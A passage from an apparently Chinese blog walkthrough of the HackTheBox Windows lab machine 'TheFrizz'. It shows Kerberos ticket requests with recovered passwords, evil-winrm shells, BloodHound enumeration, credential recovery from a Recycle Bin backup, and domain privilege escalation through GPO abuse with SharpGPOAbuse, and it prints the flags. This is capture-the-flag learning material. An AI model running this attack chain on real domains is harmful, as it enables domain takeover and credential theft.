http\n135/tcp   open  msrpc\n139/tcp   open  netbios-ssn\n389/tcp   open  ldap\n445/tcp   open  microsoft-ds\n464/tcp   open  kpasswd5\n593/tcp   open  http-rpc-epmap\n3268/tcp  open  globalcatLDAP\n3269/tcp  open  globalcatLDAPssl\n5985/tcp  open  wsman\n9389/tcp  open  adws\n</code></pre>\n<p>使用密码尝试<code>SMB</code>，<code>WinRM</code>等服务无果</p>\n<p>想起来之前有个信息，在WEB渗透前期得到的</p>\n<pre><code class=\"hljs language-bash\">\nWelcome\n\n*NOTICE** Due to unplanned Pentesting by students, WES is migrating applications and tools to stronger security protocols. During this transition, Ms. Fiona Frizzle will be migrating Gibbon to utilize our Azure Active Directory SSO. Please note this might take 48 hours <span class=\"hljs-built_in\">where</span> your accounts will not be available. Please bear with us, and thank you <span class=\"hljs-keyword\">for</span> your patience. Anything that can not utilize Azure AD will use the strongest available protocols such as Kerberos.\n欢迎\n\n*注意** 由于学生进行计划外的渗透测试，WES 正在将应用程序和工具迁移到更强大的安全协议。在此过渡期间，Fiona Frizzle 女士将迁移 Gibbon 以利用我们的 Azure Active Directory SSO。请注意，这可能需要 48 小时，在此期间您的帐户将不可用。请耐心等待，感谢您的耐心。任何无法使用 Azure AD 的东西都将使用最强大的可用协议，例如 Kerberos。\n</code></pre>\n<p>可能是需要使用<code>Kerberos</code>协议进行认证</p>\n<p>申请TGT票据</p>\n<pre><code class=\"hljs language-bash\">ntpdate -n firzzdc.frizz.htb\n<span class=\"hljs-built_in\">sudo</span> systemctl stop systemd-timesyncd\nntpdate -s 10.129.224.51\ngetTGT.py frizz.htb/f.frizzle:<span class=\"hljs-string\">'Jenni_Luvs_Magic23'</span> -dc-ip frizzdc.frizz.htb\n</code></pre>\n<p><img src=\"/post-images/HackTheBoxSeason7-TheFrizz/image52.png\" alt=\"image.png\"></p>\n<p>导入票据</p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-built_in\">export</span> KRB5CCNAME=f.frizzle.ccache\n</code></pre>\n<p>还需要设置<code>REALM</code></p>\n<pre><code class=\"hljs language-bash\">[domain_realm]\n    .frizz.htb = FRIZZ.HTB\n    frizz.htb = FRIZZ.HTB\n\n[libdefaults]\n    default_realm = FRIZZ.HTB\n    dns_lookup_realm = <span class=\"hljs-literal\">false</span>\n    dns_lookup_kdc = <span class=\"hljs-literal\">true</span>\n    ticket_lifetime = 24h\n    forwardable = <span class=\"hljs-literal\">true</span>\n\n[realms]\n    FRIZZ.HTB = {\n        kdc = frizzdc.frizz.htb\n        admin_server = frizzdc.frizz.htb\n        default_domain = frizz.htb\n    }\n</code></pre>\n<pre><code class=\"hljs language-bash\">\nntpdate -s 10.10.11.60\n<span class=\"hljs-built_in\">sudo</span> evil-winrm -i frizzdc.frizz.htb -r frizz.htb -k f.frizzle.ccache\n</code></pre>\n<p>成功获得<code>shell</code></p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/test/TheFrizz  ntpdate -s 10.129.224.51\n<span class=\"hljs-built_in\">sudo</span> evil-winrm -i frizzdc.frizz.htb -r frizz.htb -k f.frizzle.ccache\n                                        \nEvil-WinRM shell v3.7\n                                        \nWarning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() <span class=\"hljs-keyword\">function</span> is unimplemented on this machine\n                                        \nData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion\n                                        \nWarning: Useless cert/s provided, SSL is not enabled\n                                        \nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\f.frizzle\\Documents> <span class=\"hljs-built_in\">whoami</span>\nfrizz\\f.frizzle\n</code></pre>\n<p>在当前目录下可以拿到user标志</p>\n<pre><code class=\"hljs language-bash\">*Evil-WinRM* PS C:\\Users\\f.frizzle\\Desktop> <span class=\"hljs-built_in\">type</span> user.txt\n8fb10ca6761f988d8da6d5b41916ea65\n</code></pre>\n<h2>提权 - M.SchoolBus</h2>\n<p>尝试使用BloodHound使用<code>f.frizzle</code>收集的凭据进行分析</p>\n<pre><code class=\"hljs language-bash\">*Evil-WinRM* PS C:\\Users\\f.frizzle\\Desktop> upload SharpHound.exe                                                                                            \n                                                                                                                                                             \nInfo: Uploading /root/Desktop/test/TheFrizz/SharpHound.exe to C:\\Users\\f.frizzle\\Desktop\\SharpHound.exe              \n                                                                              \nData: 1395368 bytes of 1395368 bytes copied    \n\n*Evil-WinRM* PS C:\\Users\\f.frizzle\\Desktop> ./SharpHound.exe                                                                                                 \n2025-03-18T01:32:03.3495607-07:00|INFORMATION|This version of SharpHound is compatible with the 4.3.1 Release of BloodHound                                  \n2025-03-18T01:32:03.4746029-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTar\ngets, PSRemote                                                                                                                                               \n2025-03-18T01:32:03.5058237-07:00|INFORMATION|Initializing SharpHound at 1:32 AM on 3/18/2025                                                                \n2025-03-18T01:32:03.6464352-07:00|INFORMATION|[CommonLib LDAPUtils]Found usable Domain Controller <span class=\"hljs-keyword\">for</span> frizz.htb : frizzdc.frizz.htb                          \n2025-03-18T01:32:03.6777446-07:00|INFORMATION|Flags: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote     \n2025-03-18T01:32:03.8496941-07:00|INFORMATION|Beginning LDAP search <span class=\"hljs-keyword\">for</span> frizz.htb                                                                            \n2025-03-18T01:32:03.9121449-07:00|INFORMATION|Producer has finished, closing LDAP channel                                                                    \n2025-03-18T01:32:03.9121449-07:00|INFORMATION|LDAP channel closed, waiting <span class=\"hljs-keyword\">for</span> consumers                                                                     \n2025-03-18T01:32:34.0527670-07:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 36 MB RAM                                                         \n2025-03-18T01:32:51.8339357-07:00|INFORMATION|Consumers finished, closing output channel                                                                     \n2025-03-18T01:32:51.8651850-07:00|INFORMATION|Output channel closed, waiting <span class=\"hljs-keyword\">for</span> output task to complete             \nClosing writers                                                               \n2025-03-18T01:32:52.0839376-07:00|INFORMATION|Status: 110 objects finished (+110 2.291667)/s -- Using 44 MB RAM                                              \n2025-03-18T01:32:52.0839376-07:00|INFORMATION|Enumeration finished <span class=\"hljs-keyword\">in</span> 00:00:48.2359394                                                                       \n2025-03-18T01:32:52.1777023-07:00|INFORMATION|Saving cache with stats: 69 ID to <span class=\"hljs-built_in\">type</span> mappings.                                                               \n 69 name to SID mappings.                                                                                                                                    \n 0 machine sid mappings.                                                      \n 2 sid to domain mappings.                                                                                                                                   \n 0 global catalog mappings.                                                   \n2025-03-18T01:32:52.1933287-07:00|INFORMATION|SharpHound Enumeration Completed at 1:32 AM on 3/18/2025! Happy Graphing! \n\n*Evil-WinRM* PS C:\\Users\\f.frizzle\\Desktop> download 20250318013251_BloodHound.zip\n                                        \nInfo: Downloading C:\\Users\\f.frizzle\\Desktop\\20250318013251_BloodHound.zip to 20250318013251_BloodHound.zip\n                                        \nInfo: Download successful!\n</code></pre>\n<p>但是分析后没找到利用的方法，但是在回收站能找到有趣的东西…..(经提示)</p>\n<pre><code class=\"hljs language-bash\">*Evil-WinRM* PS C:\\Users\\f.frizzle\\Documents> <span class=\"hljs-built_in\">cd</span> <span class=\"hljs-string\">'C:\\$Recycle.Bin\\S-1-5-21-2386970044-1145388522-2932701813-1103'</span>\n\n*Evil-WinRM* PS C:\\<span class=\"hljs-variable\">$Recycle</span>.Bin\\S-1-5-21-2386970044-1145388522-2932701813-1103> <span class=\"hljs-built_in\">dir</span>\n\n    Directory: C:\\<span class=\"hljs-variable\">$Recycle</span>.Bin\\S-1-5-21-2386970044-1145388522-2932701813-1103\n\nMode                 LastWriteTime         Length Name\n----                 -------------         ------ ----\n-a----        10/29/2024   7:31 AM            148 <span class=\"hljs-variable\">$IE2XMEG</span>.7z\n-a----        10/24/2024   9:16 PM       30416987 <span class=\"hljs-variable\">$RE2XMEG</span>.7z\n</code></pre>\n<p>存在两个7z文件，转储出来</p>\n<pre><code class=\"hljs language-bash\">*Evil-WinRM* PS C:\\<span class=\"hljs-variable\">$Recycle</span>.Bin\\S-1-5-21-2386970044-1145388522-2932701813-1103> <span class=\"hljs-built_in\">cp</span> <span class=\"hljs-string\">'$IE2XMEG.7z'</span> backup_1.7z\n*Evil-WinRM* PS C:\\<span class=\"hljs-variable\">$Recycle</span>.Bin\\S-1-5-21-2386970044-1145388522-2932701813-1103> <span class=\"hljs-built_in\">cp</span> <span class=\"hljs-string\">'$RE2XMEG.7z'</span> backup_2.7z\n*Evil-WinRM* PS C:\\<span class=\"hljs-variable\">$Recycle</span>.Bin\\S-1-5-21-2386970044-1145388522-2932701813-1103> <span class=\"hljs-built_in\">cp</span> <span class=\"hljs-string\">'backup_1.7z'</span> C:\\<span class=\"hljs-built_in\">users</span>\\f.frizzle\\Documents\\\n*Evil-WinRM* PS C:\\<span class=\"hljs-variable\">$Recycle</span>.Bin\\S-1-5-21-2386970044-1145388522-2932701813-1103> <span class=\"hljs-built_in\">cp</span> <span class=\"hljs-string\">'backup_2.7z'</span> C:\\<span class=\"hljs-built_in\">users</span>\\f.frizzle\\Documents\\\n</code></pre>\n<p>转储出来后，发现<code>backup_1.7z</code>无法解压</p>\n<p>将<code>backup_1.7z</code> 后缀名改为<code>txt</code> 再查看</p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/test/TheFrizz  <span class=\"hljs-built_in\">mv</span> backup_1.7z backup_1.txt   \n⚡ root@kali  ~/Desktop/test/TheFrizz  <span class=\"hljs-built_in\">cat</span> backup_1.txt      \n[ 2*&#x3C;C:\\Users\\f.frizzle\\AppData\\Local\\Temp\\wapt-backup-sunday.7z# \n</code></pre>\n<p><code>backup_2.7z</code>解压出是<code>wapt</code>的目录，查看其配置文件</p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/test/TheFrizz/wapt  <span class=\"hljs-built_in\">cat</span> conf/waptserver.ini\n[options]\nallow_unauthenticated_registration = True\nwads_enable = True\nlogin_on_wads = True\nwaptwua_enable = True\nsecret_key = ylPYfn9tTU9IDu9yssP2luKhjQijHKvtuxIzX9aWhPyYKtRO7tMSq5sEurdTwADJ\nserver_uuid = 646d0847-f8b8-41c3-95bc-51873ec9ae38\ntoken_secret_key = 5jEKVoXmYLSpi5F7plGPB4zII5fpx0cYhGKX5QC0f7dkYpYmkeTXiFlhEJtZwuwD\nwapt_password = IXN1QmNpZ0BNZWhUZWQhUgo=\nclients_signing_key = C:\\wapt\\conf\\ca-192.168.120.158.pem\nclients_signing_certificate = C:\\wapt\\conf\\ca-192.168.120.158.crt\n\n[tftpserver]\nroot_dir = c:\\wapt\\waptserver\\repository\\wads\\pxe\nlog_path = c:\\wapt\\<span class=\"hljs-built_in\">log</span>\n</code></pre>\n<p>对<code>wapt_password</code>进行解码，得到密码<code>!suBcig@MehTed!R</code></p>\n<p><img src=\"/post-images/HackTheBoxSeason7-TheFrizz/image53.png\" alt=\"image.png\"></p>\n<p>经过测试，最后知道密码是<code>M.SchoolBus</code>用户的</p>\n<pre><code class=\"hljs language-bash\">ntpdate -s 10.129.224.51\ngetTGT.py frizz.htb/M.SchoolBus:<span class=\"hljs-string\">'!suBcig@MehTed!R'</span> -dc-ip frizzdc.frizz.htb\n</code></pre>\n<p><img src=\"/post-images/HackTheBoxSeason7-TheFrizz/image54.png\" alt=\"image.png\"></p>\n<p>使用新的票据进行<code>evil</code>登录，成功登录</p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/test/TheFrizz  <span class=\"hljs-built_in\">export</span> KRB5CCNAME=M.SchoolBus.ccache\n ⚡ root@kali  ~/Desktop/test/TheFrizz  ntpdate -s 10.129.224.51            \n<span class=\"hljs-built_in\">sudo</span> evil-winrm -i frizzdc.frizz.htb -r frizz.htb -k M.SchoolBus.ccache\n                                                                       \nEvil-WinRM shell v3.7          \nWarning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() <span class=\"hljs-keyword\">function</span> is unimplemented on this machine                      \n                                                                       \nData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                        \n                                                                                                                                                             \nWarning: Useless cert/s provided, SSL is not enabled                   \n                                                                       \nInfo: Establishing connection to remote endpoint                              \n*Evil-WinRM* PS C:\\Users\\M.SchoolBus\\Documents>     \n</code></pre>\n<h2>提权</h2>\n<pre><code class=\"hljs language-bash\">*Evil-WinRM* PS C:\\Users\\M.SchoolBus> ./SharpHound.exe -c all\n2025-03-18T07:02:16.4901041-07:00|INFORMATION|This version of SharpHound is compatible with the 4.3.1 Release of BloodHound\n2025-03-18T07:02:16.6463559-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote\n2025-03-18T07:02:16.6776043-07:00|INFORMATION|Initializing SharpHound at 7:02 AM on 3/18/2025\n2025-03-18T07:02:16.7869804-07:00|INFORMATION|[CommonLib LDAPUtils]Found usable Domain Controller <span class=\"hljs-keyword\">for</span> frizz.htb : frizzdc.frizz.htb\n2025-03-18T07:02:17.0369968-07:00|INFORMATION|Loaded cache with stats: 70 ID to <span class=\"hljs-built_in\">type</span> mappings.\n 70 name to SID mappings.\n 0 machine sid mappings.\n 2 sid to domain mappings.\n 0 global catalog mappings.\n2025-03-18T07:02:17.0526049-07:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote\n2025-03-18T07:02:17.2088556-07:00|INFORMATION|Beginning LDAP search <span class=\"hljs-keyword\">for</span> frizz.htb\n2025-03-18T07:02:17.2557291-07:00|INFORMATION|Producer has finished, closing LDAP channel\n2025-03-18T07:02:17.2557291-07:00|INFORMATION|LDAP channel closed, waiting <span class=\"hljs-keyword\">for</span> consumers\n2025-03-18T07:02:47.2244906-07:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 39 MB RAM\n2025-03-18T07:03:04.5682491-07:00|INFORMATION|Consumers finished, closing output channel\nClosing writers\n2025-03-18T07:03:04.6151161-07:00|INFORMATION|Output channel closed, waiting <span class=\"hljs-keyword\">for</span> output task to complete\n2025-03-18T07:03:04.7244793-07:00|INFORMATION|Status: 112 objects finished (+112 2.382979)/s -- Using 44 MB RAM\n2025-03-18T07:03:04.7244793-07:00|INFORMATION|Enumeration finished <span class=\"hljs-keyword\">in</span> 00:00:47.5265832\n2025-03-18T07:03:04.8182454-07:00|INFORMATION|Saving cache with stats: 70 ID to <span class=\"hljs-built_in\">type</span> mappings.\n 70 name to SID mappings.\n 0 machine sid mappings.\n 2 sid to domain mappings.\n 0 global catalog mappings.\n2025-03-18T07:03:04.8338673-07:00|INFORMATION|SharpHound Enumeration Completed at 7:03 AM on 3/18/2025! Happy Graphing!\n\n*Evil-WinRM* PS C:\\Users\\M.SchoolBus> download 20250318070304_BloodHound.zip\n\n                                        \nInfo: Downloading C:\\Users\\M.SchoolBus\\20250318070304_BloodHound.zip to 20250318070304_BloodHound.zip\n                                        \nInfo: Download successful!\n</code></pre>\n<p>导入BloodHound，这里我导入的数据会比他们少点，这里我贴他们的图</p>\n<p><img src=\"/post-images/HackTheBoxSeason7-TheFrizz/image55.png\" alt=\"image.png\"></p>\n<p>可以看到<code>M.SchoolBus</code>对<code>Class_Frizz@Frizz.htb</code>有write权限，并且对<code>Domain Controllers@Frizz.htb</code>有写权限，那么就存在GPO滥用</p>\n<p><strong>WriteGPO Link（写入 GPO 组策略的权限）</strong>，表明它能够修改组策略，可能导致域权限提升（Privilege Escalation）。</p>\n<p>利用工具：<a href=\"https://github.com/FSecureLABS/SharpGPOAbuse\">https://github.com/FSecureLABS/SharpGPOAbuse</a> | <a href=\"https://github.com/byronkg/SharpGPOAbuse\">https://github.com/byronkg/SharpGPOAbuse</a></p>\n<pre><code class=\"hljs language-bash\">*Evil-WinRM* PS C:\\Users\\M.SchoolBus\\Documents> upload SharpGPOAbuse.exe\nInfo: Uploading /root/Desktop/test/TheFrizz/SharpGPOAbuse.exe to C:\\Users\\M.SchoolBus\\Documents\\SharpGPOAbuse.exe\nData: 107860 bytes of 107860 bytes copied\nInfo: Upload successful!                                                                                                                                          \n</code></pre>\n<pre><code class=\"hljs language-bash\">*Evil-WinRM* PS C:\\Users\\M.SchoolBus\\Documents> New-GPO -Name getflag | New-GPLink -Target <span class=\"hljs-string\">\"OU=DOMAIN CONTROLLERS,DC=FRIZZ,DC=HTB\"</span> -LinkEnabled Yes         \nGpoId       : 236e8f45-c46e-4962-9cec-9d69350ddb93                                                                                                           \nDisplayName : getflag                                                                                                                                        \nEnabled     : True                                                                                                                                           \nEnforced    : False                                                                                                                                          \nTarget      : OU=Domain Controllers,DC=frizz,DC=htb                                                                                                          \nOrder       : 2    \n</code></pre>\n<ul>\n<li>**<code>New-GPO -Name** getflag</code>：创建一个新的组策略对象（GPO），名称为 <code>getflag</code>。</li>\n<li><strong><code>New-GPLink -Target \"OU=DOMAIN CONTROLLERS,DC=FRIZZ,DC=HTB\" -LinkEnabled Yes</code></strong>：\n<ul>\n<li><code>New-GPLink</code> 用于将 GPO 链接到指定的 OU（组织单位）。</li>\n<li>这里的目标是 <code>OU=DOMAIN CONTROLLERS,DC=FRIZZ,DC=HTB</code>，即 <strong>域控制器 (DC) 组织单位</strong>，表示该 GPO 作用于整个 Active Directory 域控制器。</li>\n<li><code>LinkEnabled Yes</code> 表示启用这个 GPO。</li>\n</ul>\n</li>\n</ul>\n<pre><code class=\"hljs language-bash\">*Evil-WinRM* PS C:\\Users\\M.SchoolBus\\Documents> .\\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount M.SchoolBus --GPOName getflag\n[+] Domain = frizz.htb                                                                                                                                       \n[+] Domain Controller = frizzdc.frizz.htb\n[+] Distinguished Name = CN=Policies,CN=System,DC=frizz,DC=htb\n[+] SID Value of M.SchoolBus = S-1-5-21-2386970044-1145388522-2932701813-1106\n[+] GUID of <span class=\"hljs-string\">\"getflag\"</span> is: {236E8F45-C46E-4962-9CEC-9D69350DDB93}\n[+] Creating file \\\\frizz.htb\\SysVol\\frizz.htb\\Policies\\{236E8F45-C46E-4962-9CEC-9D69350DDB93}\\Machine\\Microsoft\\Windows NT\\SecEdit\\GptTmpl.inf\n[+] versionNumber attribute changed successfully\n[+] The version number <span class=\"hljs-keyword\">in</span> GPT.ini was increased successfully.\n[+] The GPO was modified to include a new <span class=\"hljs-built_in\">local</span> admin. Wait <span class=\"hljs-keyword\">for</span> the GPO refresh cycle.\n[+] Done!\n</code></pre>\n<ul>\n<li><strong><code>SharpGPOAbuse.exe --AddLocalAdmin</code></strong>：\n<ul>\n<li>该命令使用 <strong>SharpGPOAbuse</strong> 工具修改 <code>pain</code> 这个 GPO，使得 <code>M.SchoolBus</code> 这个用户被添加为本地管理员。</li>\n</ul>\n</li>\n<li><strong><code>-UserAccount M.SchoolBus</code></strong>：\n<ul>\n<li>目标用户是 <code>M.SchoolBus</code>，意味着攻击者希望让该用户获得本地管理员权限。</li>\n</ul>\n</li>\n<li><strong><code>-GPOName pain</code></strong>：\n<ul>\n<li>指定要修改的 GPO 名称是 <code>pain</code>（之前创建的 GPO）</li>\n</ul>\n</li>\n</ul>\n<pre><code class=\"hljs language-bash\">*Evil-WinRM* PS C:\\Users\\M.SchoolBus\\Documents> gpupdate /force                                                                                              \nUpdating policy...                                                                                                                                                                                                                                                                                                                                                                                                                           \nComputer Policy update has completed successfully. \n</code></pre>\n<ul>\n<li>这个命令 <strong>强制更新</strong> 组策略，使得 <code>pain</code> GPO 立即生效。</li>\n<li>这样，<code>M.SchoolBus</code> 用户就会被成功添加到本地管理员组。</li>\n</ul>\n<p>最后读取<code>Root.txt</code></p>\n<pre><code class=\"hljs language-bash\">*Evil-WinRM* PS C:\\Users\\M.SchoolBus\\Documents> <span class=\"hljs-built_in\">type</span> C:\\Users\\Administrator\\Desktop\\root.txt                                                                 \n8f40592b0321c70f59d101a0d640a0c2 \n</code></pre>\n<p>再查看一下权限</p>\n<pre><code class=\"hljs language-bash\">*Evil-WinRM* PS C:\\Users\\M.SchoolBus\\Documents> <span class=\"hljs-built_in\">whoami</span> /priv                                                                                11:05:33 [5/1663]\n                                                                                                                                                             \nPRIVILEGES INFORMATION                                                                                                                                       \n----------------------                                                                                                                                       \n                                                                              \nPrivilege Name                            Description                                                        State             \n========================================= ================================================================== =======                                         \nSeIncreaseQuotaPrivilege                  Adjust memory quotas <span class=\"hljs-keyword\">for</span> a process                                 Enabled\nSeMachineAccountPrivilege                 Add workstations to domain                                         Enabled\nSeSecurityPrivilege                       Manage auditing and security <span class=\"hljs-built_in\">log</span>                                   Enabled\nSeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled\nSeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled                           \nSeSystemProfilePrivilege                  Profile system performance                                         Enabled\nSeSystemtimePrivilege                     Change the system <span class=\"hljs-keyword\">time</span>                                             Enabled\nSeProfileSingleProcessPrivilege           Profile single process                                             Enabled\nSeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled\nSeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled\nSeBackupPrivilege                         Back up files and directories                                      Enabled\nSeRestorePrivilege                        Restore files and directories                                      Enabled\nSeShutdownPrivilege                       Shut down the system                                               Enabled\nSeDebugPrivilege                          Debug programs                                                     Enabled\nSeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled\nSeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled\nSeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled\nSeUndockPrivilege                         Remove computer from docking station                               Enabled\nSeEnableDelegationPrivilege               Enable computer and user accounts to be trusted <span class=\"hljs-keyword\">for</span> delegation     Enabled\nSeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled\nSeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled\nSeCreateGlobalPrivilege                   Create global objects                                              Enabled\nSeIncreaseWorkingSetPrivilege             Increase a process working <span class=\"hljs-built_in\">set</span>                                     Enabled\nSeTimeZonePrivilege                       Change the <span class=\"hljs-keyword\">time</span> zone                                               Enabled\nSeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled\nSeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token <span class=\"hljs-keyword\">for</span> another user <span class=\"hljs-keyword\">in</span> the same session Enabled\n</code></pre>\n<h2>总结</h2>\n<p>学习到<code>GPO</code> 滥用，BloodHound。并且还有回收站<code>C:\\$Recycle.Bin</code> 可能会藏数据（雾），还有就是新加坡节点问题太多了</p>","title":"HackTheBox - Season7-TheFrizz","date":"2025-04-04","updated":"2025-04-04","comments":true,"tags":["HackTheBox","域渗透","Windows靶机","encrypt"],"categories":"靶机","description":"Season7-TheFrizz\n\n https://app.hackthebox.com/machines/652 | `medium` | `Windows`靶机\n \n\n前期踩点\n\n进行`nmap`扫描\n\n\n\n发现域名`frizzdc.frizz.htb` 添加到`hosts` 文件\n\n\n\n漏洞扫描\n\n\n\n先尝试`SMB`是否允许匿名用户\n\n\n\nWEB 渗透\n\n访问HTTP服务，貌似是一个教育...","isEncrypted":true},"recentPosts":[{"id":"TryHackMeCreative","title":"TryHackMe - Creative","date":"2025-07-05","isEncrypted":false,"year":"2025","month":"07","day":"05"},{"id":"HackTheBoxSeason8 - RustyKey","title":"HackTheBox - Season8 - RustyKey","date":"2025-06-30","isEncrypted":true,"year":"2025","month":"06","day":"30"},{"id":"HackTheBoxSeason8 - Artificial","title":"HackTheBox - Season8 - Artificial","date":"2025-06-28","isEncrypted":true,"year":"2025","month":"06","day":"28"},{"id":"HackTheBoxMachine - Developer","title":"HackTheBox - Machine - Developer","date":"2025-06-22","isEncrypted":false,"year":"2025","month":"06","day":"22"},{"id":"HackTheBoxMachine - TwoMillion","title":"HackTheBox - Machine - TwoMillion","date":"2025-06-21","isEncrypted":false,"year":"2025","month":"06","day":"21"},{"id":"群U靶机Tools","title":"群U靶机 - Tools","date":"2025-06-16","isEncrypted":false,"year":"2025","month":"06","day":"16"},{"id":"HackTheBoxMachine - Ellingson","title":"HackTheBox - Machine - Ellingson","date":"2025-06-15","isEncrypted":false,"year":"2025","month":"06","day":"15"}]},"__N_SSG":true}